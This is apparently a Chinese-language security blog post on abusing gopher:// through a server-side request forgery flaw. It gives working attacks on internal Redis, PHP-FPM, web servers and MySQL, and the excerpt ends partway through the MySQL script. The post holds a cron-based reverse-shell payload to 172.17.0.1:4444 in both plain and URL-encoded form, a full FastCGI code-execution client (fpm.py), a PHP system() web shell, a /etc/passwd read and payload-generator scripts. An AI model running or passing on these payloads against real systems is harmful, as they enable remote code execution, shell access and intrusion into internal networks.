---
title: Do Evil Things With Gopher://
key: 5d7c644637049f653137bb065b08f1d3
tags:
  - Gopher
  - Summary
date: 2019-11-27 09:46:26
---


## 0x00 关于 Gopher

Gopher 是一个互联网上使用的分布型的文件搜集获取网络协议。Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。


## 0x01 攻击内网 Redis

实验环境：

- CentOS 8.0.1905 (Core) 

- Nginx/1.14.1 + PHP 7.2.11

index.php:

```php
<?php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_GET["url"]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
$output = curl_exec($ch);
curl_close($ch);
?>
```

一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 如下：

```bash
# redis-cli -h $1 config set stop-writes-on-bgsave-error no
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.17.0.1/4444 0>&1\n\n"| redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/spool/cron/
redis-cli -h $1 -p $2 config set dbfilename root
redis-cli -h $1 -p $2 save
```

将本地的 4444 端口转发到本地的 6379 端口，利用脚本攻击自身并抓包得到数据流：

```bash
socat -v tcp-listen:4444,fork tcp-connect:localhost:6379
```

Socat 捕获到数据流：

```bash
> 2019/12/02 02:38:34.391245  length=84 from=0 to=83
*3\r
$3\r
set\r
$1\r
1\r
$57\r


*/1 * * * * bash -i >& /dev/tcp/172.17.0.1/4444 0>&1


\r
< 2019/12/02 02:38:34.391639  length=5 from=0 to=4
+OK\r
> 2019/12/02 02:38:34.395036  length=57 from=0 to=56
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$16\r
/var/spool/cron/\r
< 2019/12/02 02:38:34.399381  length=5 from=0 to=4
+OK\r
> 2019/12/02 02:38:34.402920  length=52 from=0 to=51
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$4\r
root\r
< 2019/12/02 02:38:34.407360  length=5 from=0 to=4
+OK\r
> 2019/12/02 02:38:34.410888  length=14 from=0 to=13
*1\r
$4\r
save\r
< 2019/12/02 02:38:34.417962  length=5 from=0 to=4
+OK\r
```


转换流量适配 Gopher:// ：

- redis2gopher.py

```py
#coding: utf-8
import sys

exp = ''

with open(sys.argv[1]) as f:
    for line in f.readlines():
        if line[0] in '><+':
            continue
        elif line[-3:-1] == r'\r':
            if len(line) == 3:
                exp = exp + '%0a%0d%0a'
            else:
                line = line.replace(r'\r', '%0d%0a')
                line = line.replace('\n', '')
                exp = exp + line
        elif line == '\x0a':
            exp = exp + '%0a'
        else:
            line = line.replace('\n', '')
            exp = exp + line
print exp
```

执行：

```
root@ubuntu:~# python redis2gopher.py socat.log
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>%26%20/dev/tcp/172.17.0.1/4444%200>%261%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

UrlEncode Payload:

```bash
?url=%67%6f%70%68%65%72%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%36%33%37%39%2f%5f%2a%33%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%31%25%30%64%25%30%61%31%25%30%64%25%30%61%24%35%37%25%30%64%25%30%61%25%30%61%25%30%61%2a%2f%31%25%32%30%2a%25%32%30%2a%25%32%30%2a%25%32%30%2a%25%32%30%62%61%73%68%25%32%30%2d%69%25%32%30%3e%25%32%36%25%32%30%2f%64%65%76%2f%74%63%70%2f%31%37%32%2e%31%37%2e%30%2e%31%2f%34%34%34%34%25%32%30%30%3e%25%32%36%31%25%30%61%25%30%61%25%30%61%25%30%64%25%30%61%2a%34%25%30%64%25%30%61%24%36%25%30%64%25%30%61%63%6f%6e%66%69%67%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%33%25%30%64%25%30%61%64%69%72%25%30%64%25%30%61%24%31%36%25%30%64%25%30%61%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%2f%25%30%64%25%30%61%2a%34%25%30%64%25%30%61%24%36%25%30%64%25%30%61%63%6f%6e%66%69%67%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%31%30%25%30%64%25%30%61%64%62%66%69%6c%65%6e%61%6d%65%25%30%64%25%30%61%24%34%25%30%64%25%30%61%72%6f%6f%74%25%30%64%25%30%61%2a%31%25%30%64%25%30%61%24%34%25%30%64%25%30%61%73%61%76%65%25%30%64%25%30%61
```

成功反弹 shell：


![](/assets/images/move/2019-12-02-11-03-42.png)

## 0x02 攻击 PHP-FPM

Fastcgi 是一个通信协议，和 HTTP 协议一样，都是进行数据交换的一个通道。HTTP 协议是浏览器和服务器中间件进行数据交换的协议，浏览器将 HTTP 头和 HTTP 体用某个规则组装成数据包，以 TCP 的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以 HTTP 协议的规则打包返回给浏览器。类比 HTTP 协议来说，fastcgi 协议则是服务器中间件（如Nginx）和某个语言后端进行数据交换的协议。Fastcgi 协议由多个 record 组成，record 也有 header 和 body 一说，服务器中间件将这二者按照 fastcgi 的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。

![](/assets/images/move/2019-12-02-21-34-51.png)

FPM（FastCGI Process Manager）其实是一个 fastcgi 协议解析器，Nginx 等服务器中间件将用户请求按照 fastcgi 的规则打包好通过 TCP 传给 FPM，FPM 按照 fastcgi 的协议将 TCP 流解析成真正的数据。PHP-FPM 默认监听 9000 端口，如果这个端口暴露在公网，则我们可以自己构造 fastcgi 协议，和 fpm 进行通信，利用 Gopher + SSRF 可以完美攻击 FastCGI 执行任意命令。

通过 Gopher 传送 FastCgi 协议 Evil 数据（设置 PHP-FPM 环境变量，开启远程文件包含）给后端语言处理，从而执行任意代码。

```php
'PHP_VALUE': 'auto_prepend_file = php://input',
'PHP_ADMIN_VALUE': 'allow_url_include = On'
```

Require：

1. libcurl >= 7.45.0 (Exp 中包含 `%00`, 低版本 Gopher 中的 %00 会被截断)；

2. PHP-FPM >= 5.3.3、监听端口(一般为 9000)、任意 php 绝对路径。

实验环境：[Vulhub / fpm](https://github.com/3ndz/vulhub/tree/master/fpm) （IP 172.18.0.2）

端口映射：

![](/assets/images/move/2019-12-03-00-20-21.png)

查找 PHP 文件绝对路径：

![](/assets/images/move/2019-12-03-00-19-19.png)


如果外网暴露 9000 端口则直接攻击利用：

```bash
python fpm.py 172.18.0.2 -p 9000  /usr/local/lib/php/pearcmd.php -c '<?php echo `id`; exit; ?>'
```

![](/assets/images/move/2019-12-03-00-27-18.png)

- fpm.py

```py
import socket
import random
import argparse
import sys
from io import BytesIO

# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client

PY2 = True if sys.version_info.major == 2 else False


def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])

def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)

def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')

def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s


class FastCGIClient:
    """A Fast-CGI Client for Python"""

    # private
    __FCGI_VERSION = 1

    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3

    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11

    __FCGI_HEADER_SIZE = 8

    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3

    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()

    def __connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # if self.keepalive:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
        # else:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
        try:
            self.sock.connect((self.host, int(self.port)))
        except socket.error as msg:
            self.sock.close()
            self.sock = None
            print(repr(msg))
            return False
        return True

    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid >> 8) & 0xFF) \
               + bchr(requestid & 0xFF) \
               + bchr((length >> 8) & 0xFF) \
               + bchr(length & 0xFF) \
               + bchr(0) \
               + bchr(0) \
               + content
        return buf

    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                      + bchr((nLen >> 16) & 0xFF) \
                      + bchr((nLen >> 8) & 0xFF) \
                      + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                      + bchr((vLen >> 16) & 0xFF) \
                      + bchr((vLen >> 8) & 0xFF) \
                      + bchr(vLen & 0xFF)
        return record + name + value

    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = bord(stream[0])
        header['type'] = bord(stream[1])
        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
        header['paddingLength'] = bord(stream[6])
        header['reserved'] = bord(stream[7])
        return header

    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))

        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''
            
            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record

    def request(self, nameValuePairs={}, post=''):
        if not self.__connect():
            print('connect failure! please check your fasctcgi-server !!')
            return

        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)

        self.sock.send(request)
        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
        self.requests[requestId]['response'] = b''
        return self.__waitForResponse(requestId)

    def __waitForResponse(self, requestId):
        data = b''
        while True:
            buf = self.sock.recv(512)
            if not len(buf):
                break
            data += buf

        data = BytesIO(data)
        while True:
            response = self.__decodeFastCGIRecord(data)
            if not response:
                break
            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                if requestId == int(response['requestId']):
                    self.requests[requestId]['response'] += response['content']
            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        return self.requests[requestId]['response']

    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
    parser.add_argument('host', help='Target host, such as 127.0.0.1')
    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')
    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)

    args = parser.parse_args()

    client = FastCGIClient(args.host, args.port, 3, 0)
    params = dict()
    documentRoot = "/"
    uri = args.file
    content = args.code
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'SCRIPT_NAME': uri,
        'QUERY_STRING': '',
        'REQUEST_URI': uri,
        'DOCUMENT_ROOT': documentRoot,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '9985',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(content),
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }
    response = client.request(params, content)
    print(force_text(response))
```

SSRF + Gopher:// 思路：

```bash
nc -lvvp 4444 > log.txt
python fpm.py 127.0.0.1 -p 4444 -c "<?php system('echo 1 > /tmp/success'); exit;?>" /usr/local/lib/php/PEAR.php
```

![](/assets/images/move/2019-12-03-00-33-14.png)

- trans.py

```python
from urllib import quote

with open('log.txt', 'r') as f:
    prefix = 'gopher://127.0.0.1:9000/_'
    data = quote(f.read())
    payload = prefix + data
    print payload
```

观察到成功创建文件 /tmp/success：

![](/assets/images/move/2019-12-03-00-40-58.png)

## 0x03 攻击内网 Web

Gopher 协议的格式：

```bash
gopher://127.0.0.1:70(默认端口)/_ + TCP/IP数据
```

这里的 `_` 是一种数据连接格式，不一定是 `_` ，其他任意字符皆可。Gopher 会将后面的数据部分发送给相应的端口，这些数据可以是字符串，也可以是其他的数据请求包，比如 GET、POST 请求，Redis，Mysql 未授权访问等，同时数据部分必须要进行 url 编码，这样 Gopher 协议才能正确解析。

- post.php

```php
<?php system($_POST['cmd']); ?>
```

![](/assets/images/move/2019-12-03-14-47-53.png)

```http
POST /post.php HTTP/1.1
Host: 47.98.224.70:7777
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://47.98.224.70:7777/post.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Origin: http://47.98.224.70:7777
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

cmd=cat /etc/passwd
```

UrlEncode Data：

```bash
$ python toGopher.py -h
Usage:
    -h     --help     Help
    -f     --file     Packet file name
    -s     --stream   Byte stream from traffic packet

$ python toGopher.py -f r.txt
%50%4f%53%54%20%2f%70%6f%73%74%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%34%37%2e%39%38%2e%32%32%34%2e%37%30%3a%37%37%37%37%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%3b%20%72%76%3a%37%30%2e%30%29%20%47%65%63%6b%6f%2f%32%30%31%30%30%31%30%31%20%46%69%72%65%66%6f%78%2f%37%30%2e%30%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%2a%2f%2a%3b%71%3d%30%2e%38%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%7a%68%2d%43%4e%2c%7a%68%3b%71%3d%30%2e%38%2c%7a%68%2d%54%57%3b%71%3d%30%2e%37%2c%7a%68%2d%48%4b%3b%71%3d%30%2e%35%2c%65%6e%2d%55%53%3b%71%3d%30%2e%33%2c%65%6e%3b%71%3d%30%2e%32%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%52%65%66%65%72%65%72%3a%20%68%74%74%70%3a%2f%2f%34%37%2e%39%38%2e%32%32%34%2e%37%30%3a%37%37%37%37%2f%70%6f%73%74%2e%70%68%70%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%39%0d%0a%4f%72%69%67%69%6e%3a%20%68%74%74%70%3a%2f%2f%34%37%2e%39%38%2e%32%32%34%2e%37%30%3a%37%37%37%37%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%43%61%63%68%65%2d%43%6f%6e%74%72%6f%6c%3a%20%6d%61%78%2d%61%67%65%3d%30%0d%0a%0d%0a%63%6d%64%3d%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64
```

Payload:

```
curl -v gopher://127.0.0.1:80/_%50%4f%53%54%20%2f%70%6f%73%74%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%34%37%2e%39%38%2e%32%32%34%2e%37%30%3a%37%37%37%37%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%3b%20%72%76%3a%37%30%2e%30%29%20%47%65%63%6b%6f%2f%32%30%31%30%30%31%30%31%20%46%69%72%65%66%6f%78%2f%37%30%2e%30%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%2a%2f%2a%3b%71%3d%30%2e%38%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%7a%68%2d%43%4e%2c%7a%68%3b%71%3d%30%2e%38%2c%7a%68%2d%54%57%3b%71%3d%30%2e%37%2c%7a%68%2d%48%4b%3b%71%3d%30%2e%35%2c%65%6e%2d%55%53%3b%71%3d%30%2e%33%2c%65%6e%3b%71%3d%30%2e%32%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%52%65%66%65%72%65%72%3a%20%68%74%74%70%3a%2f%2f%34%37%2e%39%38%2e%32%32%34%2e%37%30%3a%37%37%37%37%2f%70%6f%73%74%2e%70%68%70%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%39%0d%0a%4f%72%69%67%69%6e%3a%20%68%74%74%70%3a%2f%2f%34%37%2e%39%38%2e%32%32%34%2e%37%30%3a%37%37%37%37%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%43%61%63%68%65%2d%43%6f%6e%74%72%6f%6c%3a%20%6d%61%78%2d%61%67%65%3d%30%0d%0a%0d%0a%63%6d%64%3d%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64
```

Success:

![](/assets/images/move/2019-12-03-14-59-30.png)

- toGopher.py

```py
# -*- coding:utf8 -*-

import getopt
import sys
import re

def togopher():
    try:
        opts,args = getopt.getopt(sys.argv[1:], "hf:s:", ["help", "file=", "stream="])
    except:
        print """
        Usage: python togopher.py -f <filename>
               python togopher.py -s <Byte stream>
               python togopher.py -h
        """
        sys.exit()
    
    if len(opts) == 0:
        print "Usage: python togopher.py -h"

    for opt,value in opts:
        if opt in ("-h", "--help"):
            print """Usage: 
    -h     --help     Help
    -f     --file     Packet file name
    -s     --stream   Byte stream from traffic packet"""
            sys.exit()
        if opt in ("-f", "--file"):
            if not value:
                print "Usage: python togopher.py -f <filename>"
                sys.exit()
            words = ""
            with open(value, "r") as f:
                for i in f.readlines():
                    for j in i:
                        if re.findall(r'\n', j):
                            words += "%0d%0a"
                        else:
                            temp = str(hex(ord(j)))
                            if len(temp) == 3:
                                words += "%0" + temp[2]
                            else:
                                words += "%" + temp[2:]
            print words

        if opt in ("-s", "--stream"):
            if not value:
                print "Usage: python togopher.py -s <Bytg stream>"
                sys.exit()
            a = [value[i:i+2] for i in xrange(0, len(value), 2)]
            words = "%" + "%".join(a)
            print words

if __name__ == "__main__":
    togopher()
```

## 0x04 攻击内网 Mysql

- 探测端口

```bash
gopher://localhost:3306/_
```

- [exploit.py](https://github.com/undefinedd/extract0r-)

```python
# coding=utf-8

'''
python exploit.py -u test -d '' -P 'select now()' -v -c
'''

from socket import *
from struct import *
from urllib2 import quote,unquote
import sys
import hashlib
import argparse



def hexdump(src, title, length=16):
    result = []
    digits = 4 if isinstance(src, unicode) else 2

    for i in xrange(0, len(src), length):
        s = src[i:i + length]
        hexa = b''.join(["%0*X" % (digits, ord(x)) for x in s])
        hexa = hexa[:16]+" "+hexa[16:]
        text = b''.join([x if 0x20 <= ord(x) < 0x7F else b'.' for x in s])
        result.append(b"%04X  %-*s  %s" % (i, length * (digits + 1), hexa, text))
    print title
    print(b'\n'.join(result))
    print '\n'

def create_zip(filename, content_size):
    content = '-'*content_size
    filename = pack('<%ds'%len(filename), filename)
    content_len_b = pack('<I', len(content))
    filename_len_b = pack('<H', len(filename))
    local_file_header = b"\x50\x4b\x03\x04\x0a\x00"+"\x00"*12
    local_file_header += content_len_b*2
    local_file_header += filename_len_b
    local_file_header += "\x00\x00"
    local_file_header += filename
    cd_file_header = b"\x50\x4b\x01\x02\x1e\x03\x0a\x00"+"\x00"*12+filename_len_b+"\x00"*16+filename
    cd_file_header_len_b = pack("<I", len(cd_file_header))
    offset = pack("<I",len(local_file_header+cd_file_header))
    eof_record = b"\x50\x4b\x05\x06"+"\x00"*4+"\x01\x00"*2+cd_file_header_len_b+offset+"\x00\x00"
    #return each party of zip
    return [local_file_header,content,cd_file_header+eof_record]



class Protocal:   
    last_packet_index = 0 
    connect_status = 0 #mark last connection is finish or no
    login_packet = ''
    def __init__(self, host, port, username, password, database):
        self.username = username
        self.password = password
        self.database = database
        self.host = host
        self.port = port
        

    def __unpack(self, data):
        length = unpack('I', data[:3]+b'\x00')
        self.last_packet_index = unpack('B', data[3:4])[0]
        if len(data)-4 != length[0]:
            print '[-] packet parse error, except lengt {} but {}'.format(length[0], len(data))
            sys.exit(1)
        return data[4:];

    def __pack(self, data):
        if self.connect_status == 0:
            self.last_packet_index += 1
        elif self.connect_status == 1:
            self.last_packet_index = 0
        header = len(data)
        header = pack('<I', len(data))[:3]+pack('B', self.last_packet_index)
        return header+data

    def __parse_handshake(self, data):
        if DEBUG:
            hexdump(data,'server handshake')
        data = self.__unpack(data)
        protocolVersion = unpack('B', data[:1])
        svLen = 0
        for byte in data[1:]:
            svLen += 1
            if byte == b'\x00':
                break;
        serverVersion = data[1:svLen]
        threadId = unpack('I', data[svLen+1:svLen+5])
        scramble = unpack('8B', data[svLen+5:svLen+13])
        serverEncode = unpack('B',data[svLen+16:svLen+17])
        scramble += unpack('12B', data[svLen+32:svLen+44])
        scramble = ''.join([chr(i) for i in scramble])
        packet = {
            'protocolVersion':protocolVersion[0],
            'serverVersion':serverVersion[0],
            'threadId':threadId[0],
            'scramble':scramble,
            'serverEncode':serverEncode[0]
        }
        return packet

    def encode_password(self, password, scramble):
        if password:
            stage1_hash = self.__sha1(password)
            token = self.xor_string(self.__sha1(scramble+self.__sha1(stage1_hash)), stage1_hash)
            return token
        else:
            return ""

    def xor_string(self, str1, str2):
        r = ''
        for x,y in zip(str1, str2):
            r += chr(ord(x)^ord(y))
        return r

    def __sha1(self, data):
        m = hashlib.sha1()
        m.update(data)
        return m.digest()
    
    def get_client_capabilities(self):
        CLIENT_LONG_PASSWORD = 0x0001
        CLIENT_FOUND_ROWS = 0x0002
        CLIENT_LONG_FLAG         = 0x0004
        CLIENT_CONNECT_WITH_DB = 0x0008
        CLIENT_ODBC = 0x0040
        CLIENT_IGNORE_SPACE = 0x0100
        CLIENT_PROTOCOL_41 = 0x0200
        CLIENT_INTERACTIVE = 0x0400
        CLIENT_IGNORE_SIGPIPE = 0x1000
        CLIENT_TRANSACTIONS = 0x2000
        CLIENT_SECURE_CONNECTION = 0x8000
        flag = 0;
        flag = flag|CLIENT_LONG_PASSWORD|CLIENT_FOUND_ROWS|CLIENT_LONG_FLAG|CLIENT_CONNECT_WITH_DB|CLIENT_ODBC|CLIENT_IGNORE_SPACE|CLIENT_PROTOCOL_41|CLIENT_INTERACTIVE|CLIENT_IGNORE_SIGPIPE|CLIENT_TRANSACTIONS|CLIENT_SECURE_CONNECTION;
        return pack('I', flag);

    def __write(self, data):
        return self.sock.send(data)

    def __read(self, lentgh):
        return self.sock.recv(lentgh)   

    def __get_login_packet(self, scramble):
        packet = ''
        packet += self.get_client_capabilities() #clientFlags
        packet += pack('I', 1024*1024*16) #maxPacketSize
        packet += b'\x21' #charset 0x21=utf8
        packet += b'\x00'*23
        packet += self.username+b'\x00'
        passowrd = self.encode_password(self.password, scramble)
        packet += chr(len(passowrd))+passowrd
        packet += self.database + b'\x00'
        packet = self.__pack(packet)
        return packet

    def execute(self, sql):
        packet = self.__pack(b'\x03'+sql)
        if DEBUG:
            hexdump(packet, 'execute request packet')
        self.__write(packet)
        response = self.__read(1000)
        if DEBUG:
            hexdump(response, 'execute result packet')
        return response

    def __login(self, scramble):
        packet = self.__get_login_packet(scramble);
        if DEBUG:
            hexdump(packet, 'client login packet:')
        self.__write(packet);
        response = self.__read(1024)
        responsePacket = self.__unpack(response)
        self.connect_status = 1;
        if responsePacket[0] == b'\x00':
            print '[+] Login Success'
        else:
            print '[+] Login error, reason:{}'.format(responsePacket[4:])
        if DEBUG:
            hexdump(response, 'client Login Result packet:')

    def get_payload(self, _sql, size, verbose):
        if _sql[-1] == ';':
            _sql = _sql[:-1]
        zipFile = create_zip('this_is_the_flag', size)
        sql = 'select concat(cast({pre} as binary), rpad(({sql}), {size}, \'-\'), cast({suf} as binary))'.format(pre='0x'+zipFile[0].encode('hex'), sql=_sql, size=size, suf='0x'+zipFile[2].encode('hex'))
        if verbose:
            print 'sql: ',sql
        login_packet = self.__get_login_packet('')
        self.connect_status = 1;
        packet = self.__pack(b'\x03'+sql)
        return login_packet + packet

    def connect(self):
        try:
            self.sock = socket(AF_INET, SOCK_STREAM)
            self.sock.connect((self.host, int(self.port)))
        except Exception,e:
            print '[-] connect error: {}'.format(str(e))
            return
        handshakePacket = self.__read(1024)
        handshakeInfo = self.__parse_handshake(handshakePacket);
        self.__login(handshakeInfo['scramble'])





parser = argparse.ArgumentParser(description='generate payload of gopher attack mysql')
parser.add_argument("-u", "--user", help="database user", required=True)
parser.add_argument("-d", "--database", help="select database", required=True)
